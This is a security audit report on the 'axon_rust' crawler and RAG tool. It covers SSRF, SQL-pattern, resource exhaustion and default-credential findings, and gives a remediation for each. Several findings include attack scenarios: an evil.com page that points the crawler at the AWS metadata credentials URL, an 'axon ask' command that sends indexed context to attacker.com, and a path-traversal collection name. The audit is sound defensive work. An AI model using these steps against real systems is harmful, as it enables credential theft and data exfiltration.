# Axon Rust Security Audit Report

**Date:** 2026-02-19
**Branch:** `perf/command-performance-fixes`
**Auditor:** Security Review (Comprehensive)
**Scope:** Full codebase static analysis covering SSRF, injection, credential handling, input validation, path traversal, information disclosure, dependency security, and job system integrity.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Critical Findings](#critical-findings)
3. [High Severity Findings](#high-severity-findings)
4. [Medium Severity Findings](#medium-severity-findings)
5. [Low Severity Findings](#low-severity-findings)
6. [Informational Findings](#informational-findings)
7. [Positive Security Observations](#positive-security-observations)
8. [Recommendations Summary](#recommendations-summary)

---

## Executive Summary

The axon_rust codebase demonstrates a security-conscious design with several strong practices already in place: a dedicated SSRF guard (`validate_url()`), credential redaction in log output (`redact_url()`), parameterized SQL queries with a safe `JobTable` enum, UUID v4 for job IDs, and Docker ports bound exclusively to `127.0.0.1`. However, the audit identified **2 critical**, **4 high**, **6 medium**, and **5 low** severity findings that warrant attention before any broader deployment.

The most consequential issue is that spider.rs crawl operations bypass the SSRF guard entirely -- the crawl engine feeds user-supplied URLs directly to `Website::new()` without going through `validate_url()`, meaning every page the crawler discovers and fetches is unguarded. This represents a complete SSRF bypass for all crawl, extract, and map operations.

---

## Critical Findings

### C-01: Spider.rs Crawl Engine Bypasses SSRF Guard (CWE-918)

**Severity:** Critical
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/crawl/engine.rs` lines 134, 224, 290
- `/home/jmagar/workspace/axon_rust/crates/core/content.rs` line 225 (`run_extract_with_engine`)

**Description:**
The `validate_url()` function in `http.rs` provides comprehensive SSRF protection for `fetch_html()` calls. However, the spider.rs crawl engine -- which handles the bulk of HTTP requests in the system -- completely bypasses this guard. In `configure_website()` (line 134), the user-supplied `start_url` is passed directly to `Website::new(start_url)` without any call to `validate_url()`.

While `run_crawl()` in `crawl.rs` (line 32) does call `validate_url(start_url)` on the initial URL, this only validates the seed URL. Spider.rs then autonomously discovers and fetches additional URLs during the crawl, and those discovered URLs are never validated against the SSRF blocklist. An attacker can craft a public page that contains links to `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://10.0.0.1/admin`, or any other internal endpoint. Spider will follow these links.

Additionally, `run_extract_with_engine()` in `content.rs` (line 225) calls `Website::new(start_url)` and `crawl_raw()` without any SSRF validation at all -- neither the seed URL nor discovered URLs.

**Attack Scenario:**
1. Attacker creates `https://evil.com/redirect.html` containing `<a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">link</a>`.
2. User runs `axon crawl https://evil.com/redirect.html --wait true`.
3. `validate_url("https://evil.com/redirect.html")` passes (public URL).
4. Spider discovers and fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
5. AWS IAM credentials are scraped, converted to markdown, saved to disk, and potentially embedded into Qdrant where they can be retrieved via `axon query`.

**Remediation:**
- Implement a request interceptor or URL filter callback on the spider `Website` builder that calls `validate_url()` before each fetch.
- Spider supports `with_blacklist_url()` for regex-based blocking -- add patterns for private IP ranges as a defense-in-depth measure alongside a proper callback.
- Apply the same protection to `run_extract_with_engine()` and `crawl_and_collect_map()`.

---

### C-02: Missing SSRF Guard on Batch URL Fetching Path (CWE-918)

**Severity:** Critical
**File:** `/home/jmagar/workspace/axon_rust/crates/cli/commands/batch.rs` lines 322-332

**Description:**
The `spawn_batch_fetch_tasks()` function calls `fetch_html(&client, &url)`, which does call `validate_url()` internally. **This path is protected.** However, the batch worker at `/home/jmagar/workspace/axon_rust/crates/jobs/batch_jobs/worker.rs` line 46 also calls `fetch_html(&client, url)`. Since `fetch_html()` includes `validate_url()`, the batch worker path is also protected.

**Correction:** Upon deeper inspection, this is NOT a critical finding. `fetch_html()` always calls `validate_url()`. The critical gap is specifically in spider.rs crawl paths (C-01 above). Downgrading this to informational -- the batch `fetch_html` path is correctly guarded.

**Revised Severity:** Informational (false positive on initial assessment; retained for audit completeness)

---

## High Severity Findings

### H-01: Silent `mark_job_failed` Discards Database Errors (CWE-754)

**Severity:** High
**File:** `/home/jmagar/workspace/axon_rust/crates/jobs/common.rs` lines 222-232

**Description:**
The `mark_job_failed()` function silently discards the result of the `UPDATE` query:
```rust
let _ = sqlx::query(&query)
    .bind(id)
    .bind(error_text)
    .execute(pool)
    .await;
```
If the database connection is lost or the query fails, the job remains in `running` status indefinitely. The watchdog will eventually reclaim it, but the original error context is lost, and the job may be retried without any record of the original failure. In a production scenario with database instability, this creates zombie jobs that obscure the true system state.

**Remediation:**
- Log the database error when `mark_job_failed` itself fails.
- Consider returning `Result` so callers can take additional action (e.g., alerting).

---

### H-02: Unbounded Progress Channel -- Memory Exhaustion Under Load (CWE-770)

**Severity:** High
**File:** `/home/jmagar/workspace/axon_rust/crates/jobs/crawl_jobs/runtime/worker/worker_process.rs` line 267

**Description:**
The progress reporting channel uses `tokio::sync::mpsc::unbounded_channel::<CrawlSummary>()`. Under the `extreme` or `max` performance profiles with aggressive concurrency (up to 1024 crawl connections), progress updates can be produced far faster than the database-bound consumer can drain them. Each `CrawlSummary` is small individually, but at extreme scale with an adversarially large site, the unbounded queue can grow without limit.

**Attack Scenario:**
An attacker provides a URL to a site that generates millions of thin pages (e.g., a parameterized search page with infinite pagination). Under the `max` performance profile, this floods the progress channel and exhausts worker memory.

**Remediation:**
- Replace `unbounded_channel` with a bounded channel (e.g., capacity 1024). The sender can drop excess progress updates without correctness impact since progress is informational only.
- Alternatively, use `try_send()` on the unbounded channel and silently drop on `Full`.

---

### H-03: No SSRF Guard on Qdrant / TEI / LLM Backend URLs (CWE-918)

**Severity:** High
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/tei.rs` line 65
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/qdrant/client.rs` line 30
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/commands/streaming.rs` line 154

**Description:**
The `cfg.qdrant_url`, `cfg.tei_url`, and `cfg.openai_base_url` values are used to construct HTTP request URLs without any validation. These values come from environment variables or CLI flags (`--qdrant-url`, `--tei-url`, `--openai-base-url`). While in the expected self-hosted deployment model these are operator-controlled, the `--openai-base-url` flag specifically accepts arbitrary URLs from the CLI.

If a malicious actor gains CLI access (or if the CLI is exposed as a service), they can set `--openai-base-url http://169.254.169.254` and the `ask`/`evaluate`/`extract` commands will POST the user's query (including any retrieved knowledge base context) to that endpoint.

**Attack Scenario:**
1. Attacker runs: `axon ask "what are the admin credentials" --openai-base-url http://attacker.com/v1`
2. The RAG context (potentially containing sensitive indexed documents) is sent as a POST body to the attacker's server.

**Remediation:**
- For backend service URLs, consider validating that they are either on the private network (expected) or explicitly allowlisted.
- At minimum, log a warning when backend URLs point to unexpected destinations.
- Consider a `--trust-backend-urls` flag that must be explicitly set to allow non-default backend URLs.

---

### H-04: Collection Name Interpolated Into Qdrant URL Path Without Sanitization (CWE-74)

**Severity:** High
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/qdrant/client.rs` lines 30-34, 64-68, 87, 101-105, 129-132, 150, 185-188, 235-239
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/tei.rs` line 87, 101-105
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/stats.rs` lines 275-306

**Description:**
The `cfg.collection` value (from `--collection` flag or `AXON_COLLECTION` env var, default `cortex`) is interpolated directly into Qdrant REST API URL paths:
```rust
let url = format!(
    "{}/collections/{}/points/scroll",
    qdrant_base(cfg),
    cfg.collection
);
```
If `cfg.collection` contains path traversal characters (e.g., `../admin`) or URL-encoded payloads, this could manipulate the Qdrant API path.

**Attack Scenario:**
```bash
axon stats --collection "../../admin/../collections/cortex"
```
This would produce a URL like `http://qdrant:6333/collections/../../admin/../collections/cortex/points/scroll`, potentially accessing unintended Qdrant API endpoints depending on how Qdrant's HTTP server resolves relative paths.

**Remediation:**
- Validate `cfg.collection` at parse time: restrict to `[a-zA-Z0-9_-]` characters, maximum 64 characters.
- URL-encode the collection name when constructing Qdrant API paths.

---

## Medium Severity Findings

### M-01: SQL Table Names via `format!()` -- Safe Today, Fragile Pattern (CWE-89)

**Severity:** Medium
**File:** `/home/jmagar/workspace/axon_rust/crates/jobs/common.rs` lines 194-200, 210-211, 224-226, 333-343, 365-367, 380-382

**Description:**
All SQL queries use `format!()` to interpolate table names:
```rust
let query = format!(
    r#"WITH n AS (
        SELECT id FROM {table} WHERE status='pending' ...
    )"#
);
```
The table name comes from `JobTable::as_str()`, which returns `&'static str` from a fixed enum. This is safe today -- no user input can influence the table name. However, the pattern is a known anti-pattern that creates risk if the `JobTable` enum is ever extended to accept dynamic input or if a future refactor passes a string directly.

**Remediation:**
- Add a comment on the `format!()` calls documenting the safety invariant: "table name is from `JobTable::as_str()` -- always a static string, never user input."
- Consider using compile-time macros or a query builder that prevents accidental interpolation of dynamic values into SQL structure positions.

---

### M-02: `count_table_rows` in stats.rs Uses Unparameterized Table Name (CWE-89)

**Severity:** Medium
**File:** `/home/jmagar/workspace/axon_rust/crates/vector/ops/stats.rs` line 34

**Description:**
```rust
async fn count_table_rows(pool: &sqlx::PgPool, table: &str) -> Result<i64, sqlx::Error> {
    let sql = format!("SELECT COUNT(*) FROM {table}");
    sqlx::query_scalar::<_, i64>(&sql).fetch_one(pool).await
}
```
The `table` parameter is a `&str` passed from callers that use hardcoded string literals (e.g., `"axon_crawl_jobs"`). This is safe in current usage, but the function signature accepts any `&str`, making it a latent injection point.

**Remediation:**
- Change the parameter type to `JobTable` or a dedicated enum.
- Alternatively, use `sqlx::query!` with static table names at each call site.

---

### M-03: Redis Connection Per Cancel Check -- File Descriptor Exhaustion (CWE-400)

**Severity:** Medium
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/jobs/crawl_jobs/runtime/worker/worker_process.rs` lines 96-97
- `/home/jmagar/workspace/axon_rust/crates/jobs/batch_jobs/worker.rs` lines 24-25
- `/home/jmagar/workspace/axon_rust/crates/jobs/extract_jobs/worker.rs` lines 58-59
- `/home/jmagar/workspace/axon_rust/crates/jobs/embed_jobs.rs` lines 192-193

**Description:**
Every job processing function creates a new Redis client and connection to check the cancel key:
```rust
let redis_client = redis::Client::open(cfg.redis_url.clone())?;
let mut redis_conn = redis_client.get_multiplexed_async_connection().await?;
```
With multiple worker lanes processing jobs concurrently and no connection pooling, this creates a new TCP connection for every cancel check. Under high job throughput, this can exhaust file descriptors. The `redis` crate's multiplexed connection itself is efficient, but opening a new one per operation defeats that purpose.

**Remediation:**
- Create a shared Redis connection pool (or a single `MultiplexedConnection`) at worker startup and pass it through to job processors, similar to how `PgPool` is shared.

---

### M-04: Default Credentials in Fallback Configuration (CWE-798)

**Severity:** Medium
**File:** `/home/jmagar/workspace/axon_rust/crates/core/config/parse.rs` lines 243-268

**Description:**
When environment variables are not set, the config parser falls back to hardcoded default credentials:
```rust
"postgresql://axon:postgres@127.0.0.1:53432/axon" <!-- gitleaks:allow -->
"redis://127.0.0.1:53379"
"amqp://axon:axonrabbit@127.0.0.1:45535/%2f" <!-- gitleaks:allow -->
```
Additionally, `docker-compose.yaml` uses `${REDIS_PASSWORD:-changeme}` and `${RABBITMQ_PASS:-axonrabbit}` as defaults. While warnings are emitted to stderr, the system still connects with these credentials. If the `.env` file is missing or incomplete, the system operates with known-weak credentials.

**Remediation:**
- Refuse to start in non-development mode if critical credentials are at their default values.
- Add a startup check that validates credentials are not the defaults.

---

### M-05: No Input Length Validation on User-Supplied URLs and Queries (CWE-20)

**Severity:** Medium
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/cli/commands/common.rs` lines 79-115
- `/home/jmagar/workspace/axon_rust/crates/core/http.rs` line 43

**Description:**
Neither `parse_urls()` nor `validate_url()` enforces a maximum length on input URLs. The URL glob expansion in `expand_url_glob_seed()` is depth-limited to 10 (good), but a single URL string with extreme length (e.g., 1MB of query parameters) will be processed without bounds. Similarly, the `--query` parameter for `ask`/`extract` commands has no length limit.

Excessively long URLs could cause:
- Database bloat (URLs stored in `axon_crawl_jobs.url` TEXT column).
- Memory pressure in string processing.
- Potential issues with downstream services (Qdrant, TEI) that may not handle extreme payloads gracefully.

**Remediation:**
- Add a maximum URL length check in `validate_url()` (e.g., 8192 characters, matching common HTTP server limits).
- Add a maximum query length check for `--query` parameters.

---

### M-06: `Uuid::new_v5` for Qdrant Point IDs is Deterministic and Predictable (CWE-330)

**Severity:** Medium
**File:** `/home/jmagar/workspace/axon_rust/crates/vector/ops/tei.rs` lines 184-187

**Description:**
Qdrant point IDs are generated using UUID v5:
```rust
let point_id = Uuid::new_v5(
    &Uuid::NAMESPACE_URL,
    format!("{}:{}", doc.url, idx).as_bytes(),
);
```
UUID v5 is deterministic -- the same URL and chunk index always produce the same point ID. This is intentional for idempotent upserts (re-embedding the same URL replaces existing points). However, it means an attacker who knows a URL and its chunk count can predict all point IDs and construct targeted delete requests if they have access to the Qdrant API.

This is mitigated by the fact that Qdrant is bound to `127.0.0.1` and has no authentication, so direct API access implies local access to the machine.

**Remediation:**
- Accept as a known design trade-off given the self-hosted deployment model.
- If Qdrant is ever exposed beyond localhost, add Qdrant API authentication and re-evaluate this finding.

---

## Low Severity Findings

### L-01: Blocking `std::fs::read_dir` Call in Async Context (CWE-400)

**Severity:** Low
**File:** `/home/jmagar/workspace/axon_rust/crates/vector/ops/tei.rs` line 146

**Description:**
The `read_inputs()` function uses `fs::read_dir(&path)` (blocking I/O from `std::fs`) inside an async function:
```rust
let mut files: Vec<PathBuf> = fs::read_dir(&path)?
    .filter_map(Result::ok)
    .map(|e| e.path())
    .filter(|p| p.is_file())
    .collect();
```
This blocks the Tokio runtime thread. For directories with many files, this can cause latency spikes for other concurrent tasks on the same runtime. The file content reading on lines 142 and 154 correctly uses `tokio::fs::read_to_string()`, making this a partial fix -- the directory listing itself is still blocking.

**Remediation:**
- Replace `fs::read_dir` with `tokio::fs::read_dir`.

---

### L-02: Error Messages May Leak Internal Infrastructure Details (CWE-209)

**Severity:** Low
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/jobs/common.rs` lines 139-142, 172-175
- Various worker files where `err.to_string()` is stored in `error_text` column

**Description:**
Connection error messages include redacted URLs (good -- `redact_url()` is used), but error messages from database drivers, AMQP, and HTTP clients may contain internal hostnames, port numbers, or connection details:
```rust
anyhow::anyhow!(
    "postgres connect timeout: {} (if running in Docker ...)",
    redact_url(&cfg.pg_url)
)
```
The `redact_url()` function properly replaces credentials, but the URL structure itself (hostnames like `axon-postgres`, port `53432`) reveals infrastructure topology. Error text is stored in the `error_text` column and exposed via `crawl status`, `batch errors`, etc.

**Remediation:**
- For error messages visible to end users, consider using generic messages with a correlation ID rather than including infrastructure details.
- This is low severity for a self-hosted CLI tool where the operator is also the infrastructure owner.

---

### L-03: AMQP Messages Acked Before Processing (CWE-221)

**Severity:** Low
**File:** `/home/jmagar/workspace/axon_rust/crates/jobs/crawl_jobs/runtime/worker/worker_loops.rs` lines 241-249

**Description:**
AMQP messages are acknowledged before the job is processed:
```rust
// Ack before processing: crawls can run for hours, and RabbitMQ's
// consumer_timeout (default 30 min) will forcibly close the channel
delivery.ack(BasicAckOptions::default()).await;
```
This is a deliberate design decision documented in the comment -- RabbitMQ's consumer timeout would kill long-running crawl jobs. The database is the authoritative source of truth, and the watchdog reclaims orphaned jobs. However, if the worker crashes between ack and `claim_pending_by_id`, the AMQP message is lost. The polling fallback will eventually pick up the job, but there is a window where the job is pending in Postgres with no AMQP message to trigger processing.

**Remediation:**
- This is an accepted trade-off given the documented rationale. The watchdog and polling fallback provide adequate recovery. No change needed, but document this in operational runbooks.

---

### L-04: `.env.example` Contains Placeholder Patterns That Could Become Real Credentials (CWE-798)

**Severity:** Low
**File:** `/home/jmagar/workspace/axon_rust/.env.example` lines 1-97

**Description:**
The `.env.example` file uses `CHANGE_ME` and `REPLACE_ME` as placeholder values. If copied to `.env` without modification, the system will attempt to connect with `CHANGE_ME` as the PostgreSQL password, Redis password, and RabbitMQ password. The `parse.rs` fallback defaults differ from the `.env.example` values, creating a confusing situation where the system may fail silently or connect with mixed credential sets.

**Remediation:**
- Use clearly invalid placeholder values that will fail to parse (e.g., `<CHANGE_ME_BEFORE_STARTING>` with angle brackets that will cause URL parse errors).
- Add a startup validation that checks for known placeholder strings.

---

### L-05: No Rate Limiting on Query / Ask / Evaluate Commands (CWE-770)

**Severity:** Low
**Files:**
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/commands/ask.rs`
- `/home/jmagar/workspace/axon_rust/crates/vector/ops/commands/streaming.rs`

**Description:**
The `ask`, `evaluate`, and `query` commands make external API calls (to TEI for embedding, Qdrant for search, and OpenAI-compatible API for LLM responses) without any rate limiting. A script could rapidly invoke these commands to:
- Exhaust LLM API quotas/budgets.
- Overload the self-hosted TEI server.
- Generate excessive Qdrant load.

This is low severity because in the self-hosted CLI model, the operator controls access. It becomes relevant if the CLI is wrapped in a service or API gateway.

**Remediation:**
- Consider adding optional rate limiting via a configurable env var (e.g., `AXON_MAX_REQUESTS_PER_MINUTE`).
- For the current self-hosted CLI use case, this is acceptable.

---

## Informational Findings

### I-01: Job IDs Use Cryptographically Random UUIDs (Positive)

**File:** `/home/jmagar/workspace/axon_rust/crates/jobs/embed_jobs.rs` line 94, `crates/jobs/batch_jobs.rs` line 406, `crates/jobs/crawl_jobs/runtime/mod.rs` line 320, `crates/jobs/extract_jobs.rs` line 106

All job IDs are generated with `Uuid::new_v4()`, which uses `getrandom` for cryptographic randomness. Job IDs are not predictable or sequential. This is correct.

### I-02: Redis Cancel Key Pattern is UUID-Validated

**File:** `/home/jmagar/workspace/axon_rust/crates/jobs/crawl_jobs/runtime/worker/worker_process.rs` line 98

The Redis cancel key `axon:crawl:cancel:{id}` uses the job UUID which is strongly typed (`Uuid`). The `id` value in the cancel check comes from the database row (`job.id` is type `Uuid`), not from user input. The `cancel` subcommand parses the user-provided ID via `Uuid::parse_str()` which rejects malformed input. This is safe.

### I-03: AMQP Message Payloads Cannot Influence Queue Routing

AMQP messages contain only the job UUID as a string (line 241 of `common.rs`): `let payload = job_id.to_string()`. The routing key is the queue name from config. User-controlled data (URLs, prompts) is stored in the Postgres `config_json`/`urls_json` columns, not in the AMQP message. The queue name comes from config constants, not user input. There is no AMQP injection risk.

### I-04: No `std::fs` Blocking I/O in Async Context (Mostly)

A grep for `std::fs::` across the crates directory returned zero results outside of `tei.rs` line 146. All other file I/O uses `tokio::fs::*`. This is excellent async hygiene with only the single exception noted in L-01.

### I-05: Credential Redaction is Comprehensive

The `redact_url()` function in `content.rs` is used consistently when logging service URLs. Connection error messages in `common.rs` use `redact_url()` for Postgres and AMQP URLs. No grep matches were found for raw credential logging (`println!.*pg_url`, `log_info.*api_key`, etc.). The OpenAI API key is sent as a bearer token in HTTP headers (never logged), and the check `if !cfg.openai_api_key.is_empty()` prevents sending an empty Authorization header.

### I-06: Docker Compose Security Posture is Strong

- All ports bound to `127.0.0.1` (no network exposure).
- The `axon-webdriver` container explicitly overrides `env_file: []` to prevent secret leakage into the browser container.
- Images are pinned to specific versions (no `latest` tags).
- Resource limits are set on the worker container (4 CPUs, 4GB RAM).
- Healthchecks are configured on all services.
- The common service template uses `restart: unless-stopped` and file-descriptor ulimits.

### I-07: `cargo audit` Not Installed

`cargo audit` is not installed in the development environment. Dependency vulnerability scanning could not be performed automatically. The `Cargo.toml` specifies major version ranges (e.g., `reqwest = "0.12"`, `spider = "2"`) which will pull in the latest patch versions on `cargo update`.

---

## Positive Security Observations

The following security practices deserve recognition:

1. **SSRF Guard Quality:** `validate_url()` correctly handles IPv4 private ranges, IPv6 ULA/link-local, loopback, localhost, `.internal`/`.local` TLDs, and non-HTTP schemes. It uses `Url::host()` typed extraction rather than string parsing, avoiding known spider.rs IPv6 parsing issues. 21 unit tests cover the guard.

2. **Parameterized SQL:** All user data in SQL queries uses `$1`, `$2` bind parameters via sqlx. The only `format!()` interpolation is for table names from `JobTable::as_str()` static strings.

3. **Job Claim Atomicity:** `claim_next_pending()` uses `FOR UPDATE SKIP LOCKED` for safe concurrent worker access, preventing double-processing of jobs.

4. **Async I/O Discipline:** With one exception (L-01), all file I/O uses `tokio::fs::*` async operations.

5. **Connection Timeouts:** All infrastructure connections (Postgres, AMQP, Redis) have 5-second timeouts, preventing indefinite hangs.

6. **Watchdog Pattern:** The two-pass stale job detection with confirmation prevents premature reclaiming of slow-but-active jobs.

7. **UUID v4 for Job IDs:** Cryptographically random, unpredictable job identifiers.

8. **URL Glob Expansion Depth Limit:** The brace expansion in `common.rs` has `MAX_EXPANSION_DEPTH: usize = 10`, preventing combinatorial explosion.

---

## Recommendations Summary

| Priority | Finding | Action |
|----------|---------|--------|
| **Immediate** | C-01 | Add SSRF validation to spider.rs crawl paths (URL filter on `Website` builder or `with_blacklist_url` patterns for private ranges) |
| **High** | H-01 | Log errors from `mark_job_failed` instead of silently discarding |
| **High** | H-02 | Replace unbounded progress channel with bounded channel |
| **High** | H-03 | Add validation or warning for non-default backend service URLs |
| **High** | H-04 | Validate `cfg.collection` format (alphanumeric, underscore, hyphen only) |
| **Medium** | M-01/M-02 | Document SQL safety invariant; consider type-safe table name pattern |
| **Medium** | M-03 | Share Redis connection across job processors instead of creating per-job |
| **Medium** | M-04 | Add startup check rejecting default/placeholder credentials |
| **Medium** | M-05 | Add URL and query length validation |
| **Medium** | M-06 | Accept as design trade-off; document in threat model |
| **Low** | L-01 | Replace `std::fs::read_dir` with `tokio::fs::read_dir` |
| **Low** | L-02 | Use generic error messages for user-facing output |
| **Ops** | I-07 | Install and run `cargo audit` in CI pipeline |

---

*End of Security Audit Report*
